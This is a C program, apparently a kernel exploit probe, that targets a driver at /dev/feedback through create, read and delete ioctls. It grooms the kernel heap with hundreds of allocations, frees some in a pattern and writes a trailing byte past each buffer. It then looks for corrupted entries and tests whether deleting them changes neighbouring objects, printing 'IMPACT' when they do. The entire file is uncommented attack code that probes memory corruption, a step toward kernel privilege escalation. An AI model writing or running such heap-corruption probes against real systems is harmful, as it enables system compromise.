#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEV "/dev/feedback"
#define CMD_CREATE 0xc0207300u
#define CMD_DELETE 0xc0207301u
#define CMD_READ   0xc0207302u

struct request {
    uint64_t id;
    uint64_t size;
    char *name;
    char *feedback;
};

static int xioctl(int fd, uint32_t cmd, struct request *req) {
    errno = 0;
    return ioctl(fd, cmd, req);
}

static int create_fb(int fd, uint64_t id, uint64_t size, unsigned char fill, unsigned char ov) {
    char *name = malloc(0x100);
    char *body = malloc(size + 1);
    if (!name || !body) exit(1);
    memset(name, 0x4e, 0xff);
    memset(body, fill, size);
    body[size] = (char)ov;
    struct request req = { .id = id, .size = size, .name = name, .feedback = body };
    int rc = xioctl(fd, CMD_CREATE, &req);
    free(name);
    free(body);
    return rc;
}

static int read_fb(int fd, uint64_t id, char *out, size_t outsz) {
    memset(out, 0, outsz);
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = out };
    return xioctl(fd, CMD_READ, &req);
}

static int del_fb(int fd, uint64_t id) {
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = NULL };
    return xioctl(fd, CMD_DELETE, &req);
}

int main(void) {
    int fd = open(DEV, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    const int n40 = 180;
    const int n30 = 220;
    const uint64_t base40 = 0xF00000;
    const uint64_t base30 = 0xF10000;
    const uint64_t refill = 0xF20000;

    unsigned char marker[180];
    for (int i = 0; i < n40; i++) marker[i] = (unsigned char)(0x40 + (i % 40));

    for (int i = 0; i < n40; i++) create_fb(fd, base40 + i, 0x40, marker[i], 0x5a);
    for (int i = 0; i < n40; i++) if ((i % 3) == 0 || (i % 11) == 0) del_fb(fd, base40 + i);
    for (int i = 0; i < n30; i++) create_fb(fd, base30 + i, 0x30, 0x31, (unsigned char)i);
    for (int i = 0; i < 320; i++) create_fb(fd, refill + i, 0x40, 0x44, (unsigned char)((0x80 + i) & 0xff));

    uint64_t broken[180];
    int broken_n = 0;
    char out[0x80];

    for (int i = 0; i < n40; i++) {
        uint64_t id = base40 + i;
        if (read_fb(fd, id, out, sizeof(out)) != 0 && errno == 22 && broken_n < 180) {
            broken[broken_n++] = id;
        }
    }
    printf("[+] broken_n=%d\n", broken_n);

    int tested = 0;
    int impact = 0;
    for (int b = 0; b < broken_n && tested < 20; b++) {
        uint64_t bid = broken[b];
        uint64_t qid = 0;
        unsigned char qmark = 0;

        for (int d = -0x80; d <= 0x80; d++) {
            uint64_t cand = (uint64_t)((int64_t)bid + d);
            if (cand == bid) continue;
            if (read_fb(fd, cand, out, sizeof(out)) == 0) {
                unsigned char v = (unsigned char)out[0];
                if (v >= 0x40 && v < 0x40 + 40) {
                    qid = cand;
                    qmark = v;
                    break;
                }
            }
        }
        if (!qid) continue;

        tested++;
        int rc_before = read_fb(fd, qid, out, sizeof(out));
        int e_before = errno;
        unsigned char before = (rc_before == 0) ? (unsigned char)out[0] : 0;

        int rc_del_b = del_fb(fd, bid);
        int e_del_b = errno;

        int rc_after = read_fb(fd, qid, out, sizeof(out));
        int e_after = errno;
        unsigned char after = (rc_after == 0) ? (unsigned char)out[0] : 0;

        int rc_del_q = del_fb(fd, qid);
        int e_del_q = errno;

        int rc_recreate = create_fb(fd, qid, 0x40, 0x77, 0x99);
        int e_recreate = errno;

        int rc_post = read_fb(fd, qid, out, sizeof(out));
        int e_post = errno;
        unsigned char post = (rc_post == 0) ? (unsigned char)out[0] : 0;

        int changed = 0;
        if (rc_before == 0 && rc_after != 0) changed = 1;
        if (rc_before == 0 && rc_after == 0 && before != after) changed = 1;
        if (rc_del_q != 0 && rc_before == 0 && rc_after == 0) changed = 1;
        if (changed) impact++;

        printf("PAIR bid=%llu qid=%llu qmark=0x%02x | r0=%d/e%d/b0x%02x delb=%d/e%d r1=%d/e%d/b0x%02x delq=%d/e%d rec=%d/e%d r2=%d/e%d/b0x%02x %s\n",
               (unsigned long long)bid,
               (unsigned long long)qid,
               qmark,
               rc_before, e_before, before,
               rc_del_b, e_del_b,
               rc_after, e_after, after,
               rc_del_q, e_del_q,
               rc_recreate, e_recreate,
               rc_post, e_post, post,
               changed ? "IMPACT" : "-");
    }

    printf("[+] tested=%d impact=%d\n", tested, impact);

    for (int i = 0; i < n40; i++) del_fb(fd, base40 + i);
    for (int i = 0; i < n30; i++) del_fb(fd, base30 + i);
    for (int i = 0; i < 320; i++) del_fb(fd, refill + i);

    close(fd);
    return 0;
}